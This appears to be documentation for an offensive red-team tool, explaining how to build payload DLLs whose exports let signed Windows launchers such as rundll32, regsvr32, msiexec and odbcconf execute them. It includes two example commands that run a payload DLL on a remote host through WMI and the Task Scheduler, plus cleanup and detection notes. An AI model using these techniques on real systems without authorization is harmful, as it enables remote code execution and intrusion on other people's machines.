# Native DLL launchers

The Rundll32, Advpack, `msiexec`, `odbcconf`, and `regsvr32` selectors consume
native DLLs, but they invoke different exports. Select the launcher whose
contract the final binary actually implements.

## Required exports

```c
#include <windows.h>

STDAPI DllRegisterServer(void);
STDAPI DllUnregisterServer(void);
STDAPI DllInstall(BOOL install, LPCWSTR command_line);

__declspec(dllexport)
void CALLBACK Run(HWND window, HINSTANCE instance, LPSTR command_line, int show);
```

| Selector | Export called |
| --- | --- |
| `rundll32.exe` | Required `--entry-point`, such as `Run`, or an ordinal such as `#1` |
| `rundll32.exe (advpack RegisterOCX)` | `DllRegisterServer` |
| `msiexec.exe (/y)` | `DllRegisterServer` |
| `msiexec.exe (/z)` | `DllUnregisterServer` |
| `odbcconf.exe` | `DllRegisterServer` |
| `regsvr32.exe` | `DllRegisterServer` |
| `regsvr32.exe (/u)` | `DllUnregisterServer` |
| `regsvr32.exe (/i)` | `DllInstall(TRUE, ...)` |
| `regsvr32.exe (/u /i)` | `DllInstall(FALSE, ...)` |

Export only the callbacks the chosen launcher needs. Return a failing
`HRESULT` when initialization fails. Keep `DllMain` minimal because it runs
under loader lock; put substantive work in the invoked export or a deliberately
created worker.

## Names and architecture

For x86 builds, verify that the public name is undecorated. `_Run@16` does not
satisfy `--entry-point Run`. A module-definition file can pin names:

```def
LIBRARY payload
EXPORTS
    Run
    DllRegisterServer
    DllUnregisterServer
    DllInstall
```

On 64-bit Windows, native binaries under `System32` are 64-bit and the
corresponding 32-bit binaries are under `SysWOW64`. Use
`--launcher-program` when the built-in program does not match the DLL.

```text
rex WMIExec --target 10.0.0.15 --payload-type dll \
  --remote-path C:\ProgramData\payload.dll \
  --launcher rundll32.exe --entry-point Run

rex TaskSchedExec --target 10.0.0.15 --task-name TemporaryTask \
  --payload-type dll --remote-path C:\ProgramData\payload.dll \
  --launcher "regsvr32.exe (/i)"
```

`rex preflight` does not inspect exports, architecture, dependencies, or file
presence. A dispatch result means the remote API accepted the launcher process;
it does not prove that the DLL export completed successfully.

## Operator recovery

Registration callbacks can create state the BOF cannot infer. Document and
reverse it separately, wait for the launcher to release the DLL, and then
remove the remote file.

## Detection considerations

Process creation, command lines, DLL loads, and registration activity are observable. Changing the signed Windows launcher changes telemetry details, not the underlying observability.

References: [Rundll32](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32),
[DLL entry point](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-entry-point-function),
[`DllInstall`](https://learn.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-dllinstall),
and [`regsvr32`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32).
